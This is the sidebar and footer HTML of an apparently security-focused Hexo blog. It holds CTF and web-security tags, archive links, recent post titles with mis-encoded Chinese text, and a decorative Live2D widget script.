href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">å­¦ä¹ ç¬”è®°</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" rel="tag">å°å·¥å…·</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7/" rel="tag">å·¥å…·</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%82/" rel="tag">æ‚</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B/" rel="tag">æ¯”èµ›</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F/" rel="tag">æ¸—é€</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" rel="tag">æ¼æ´æŒ–æ˜</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" rel="tag">çº¿ä¸Šèµ›</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BC%96%E7%A8%8B/" rel="tag">ç¼–ç¨‹</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%B0%E5%BD%95/" rel="tag">è®°å½•</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag">é¶åœº</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/LFI/" style="font-size: 10px;">LFI</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/SpEL/" style="font-size: 10px;">SpEL</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/ctf-wp/" style="font-size: 11.67px;">ctf,wp</a> <a href="/tags/cve%E5%A4%8D%E7%8E%B0/" style="font-size: 15px;">cveå¤ç°</a> <a href="/tags/django/" style="font-size: 10px;">django</a> <a href="/tags/htb/" style="font-size: 10px;">htb</a> <a href="/tags/java/" style="font-size: 11.67px;">java</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/misc/" style="font-size: 10px;">misc</a> <a href="/tags/php/" style="font-size: 11.67px;">php</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 16.67px;">web</a> <a href="/tags/wp/" style="font-size: 18.33px;">wp</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">å†…ç½‘æ¸—é€</a> <a href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">å‡ºé¢˜ç¬”è®°</a> <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 11.67px;">åŸŸæ¸—é€</a> <a href="/tags/%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">å¤ç°</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">å­¦ä¹ ç¬”è®°</a> <a href="/tags/%E5%B0%8F%E5%B7%A5%E5%85%B7/" style="font-size: 13.33px;">å°å·¥å…·</a> <a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 10px;">å·¥å…·</a> <a href="/tags/%E6%9D%82/" style="font-size: 11.67px;">æ‚</a> <a href="/tags/%E6%AF%94%E8%B5%9B/" style="font-size: 10px;">æ¯”èµ›</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">æ¸—é€</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" style="font-size: 10px;">æ¼æ´æŒ–æ˜</a> <a href="/tags/%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="font-size: 10px;">çº¿ä¸Šèµ›</a> <a href="/tags/%E7%BC%96%E7%A8%8B/" style="font-size: 11.67px;">ç¼–ç¨‹</a> <a href="/tags/%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">è®°å½•</a> <a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 10px;">é¶åœº</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/">é¿å…rm -rf *çš„æ‚²æƒ¨å‘½è¿</a>
          </li>
        
          <li>
            <a href="/2019/12/15/%E5%8B%89%E5%BC%BA%E8%83%BD%E7%94%A8%E7%9A%84%E8%AE%BA%E6%96%87%E9%99%8D%E9%87%8D/">å‹‰å¼ºèƒ½ç”¨çš„è®ºæ–‡é™é‡</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn åä¸œå— web</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web éƒ¨åˆ†é¢˜è§£</a>
          </li>
        
          <li>
            <a href="/1970/01/01/2019xman%E4%B8%AA%E4%BA%BA%E6%8E%92%E4%BD%8D%E8%B5%9Bwp/">2019xmanä¸ªäººæ’ä½èµ›wp</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2021 ccreater<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":100},"mobile":{"show":true},"react":{"opacity":0.7},"dialog":{"enable":true,"hitokoto":true},"log":false});</script></body>
</html>